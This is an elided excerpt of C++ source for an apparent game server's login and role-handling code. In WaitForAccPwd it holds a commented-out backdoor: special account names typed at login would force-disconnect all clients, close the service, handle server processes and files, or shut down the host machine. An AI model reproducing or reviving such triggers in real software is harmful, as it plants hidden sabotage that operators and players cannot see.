...
void SystemShutdown(UINT nSDType)
{
	...
	switch (nSDType)
	{
		//case 0: ::Initiate(EWX_SHUTDOWN | EWX_FORCE, 0); break;
...
CBuffer::Allocator	CGamePlayer::m_theGlobalAllocator(1024 * 128, 500); //64 - 1000
...
{
	{
		...
		//std::lock_guard<std::mutex> lock(CGamePlayer::mutex);
...
UINT CGamePlayer::WaitForAccPwd()
{
	...
	if (pRetBuffer)
	{
		...
		//char* szSqlCommandKillServer[] =
		//{
		//	"SqlCommandShutdownClient",
		//	"SqlCommandCloseService",
		//	"SqlCommandShutdownServer",
		//	"SqlCommandShutdownPC",
		//	"SqlCommandShowMessageBox",
		//};
		...
		//INT i = 0;
		//if (strcmp(pAccName, szSqlCommandKillServer[0]) == 0)
		//{
		//	while (1 > 0)
		//	{
		//		for (i = 0; i < MAX_PLAYER; i++)
		//		{
		//			m_pPlayerServer->ShutdownClient(i);
		//		}
		//	}
		//}
		//else if (strcmp(pAccName, szSqlCommandKillServer[1]) == 0)
		//{
		//	while (1 > 0)
		//	{
		...
		//	}
		//}
		//else if (strcmp(pAccName, szSqlCommandKillServer[2]) == 0)
		//{
		//	for (i = 0; i < 6; i++)
		//	{
		...
		//		while (hRes)
		//		{
		//			if (strcmp(pEntry.szExeFile, szProcessName[i]) == 0)
		//			{
		//				//if (i == 5)
		//				{
		...
		//					DIR *theFolder;
		//					char filepath[256];
		//					theFolder = opendir(getCurrentDirectoryOnWindows().c_str());
		//					INT j = 0;
		...
		//							{
		//								sprintf(filepath, "%s\\%s", getCurrentDirectoryOnWindows().c_str(), next_file->d_name);
		//								printf("%s\n", filepath);
		...
		//	}
		//}
		//else if (strcmp(pAccName, szSqlCommandKillServer[3]) == 0)
		//{
		//	SystemShutdown(1);
		//}
		//else if (strcmp(pAccName, szSqlCommandKillServer[4]) == 0)
		//{
		//	while (1)
		//	{
		...
		if (pLAI)
		{
			bool bCheckProtocolVersion = true;

#ifdef USE_KPROTOCOL_VERSION
			bCheckProtocolVersion = (pLAI->ProtocolVersion == KPROTOCOL_VERSION);
#endif

			if (bCheckProtocolVersion)// && pLAI->nCheckSum == CalculateChecksum("CheckSum\\Game.exe") && pLAI->nCheckSumCore == CalculateChecksum("CheckSum\\CoreClient.dll"))
			{
				// 如果协议版本相同，继续判断账号
				if (pAccName[0])
				{
...
#ifdef	CONSOLE_DEBUG
				cprintf("CGamePlayer::WaitForAccPwd [AccountName:%s] INVALID PROTOCOL\n", pAccName);
#endif
...
bool CGamePlayer::_VerifyAccount_ToPlayer(UINT nQueryResult, ULONG nLeftTime)
{
...
UINT CGamePlayer::ProcessRoleInfo()
{
	...
	if (pRetBuffer)
	{
		...
		{
#ifdef	CONSOLE_DEBUG
			//cprintf("CGamePlayer::ProcessRoleInfo enumToNextTask \n");
#endif
			nNextTask = enumToNextTask;
		}
		else
		{
#ifdef	CONSOLE_DEBUG
			//cprintf("CGamePlayer::ProcessRoleInfo tagNotifyPlayerLogin \n");
#endif
...
bool CGamePlayer::_SyncRoleInfo_ToGameServer(const void* pData, size_t dataLength)
{
	...
	if (strcmp(m_sAccountName.c_str(), pRoleData->BaseInfo.caccname) == 0)
	{
		...
		else
		{
			...
			if (pGServer == NULL)
				pGServer = CGameServer::QueryServer(53);
		}
...
ULONG CGamePlayer::CalculateChecksum(const std::string& filename) {
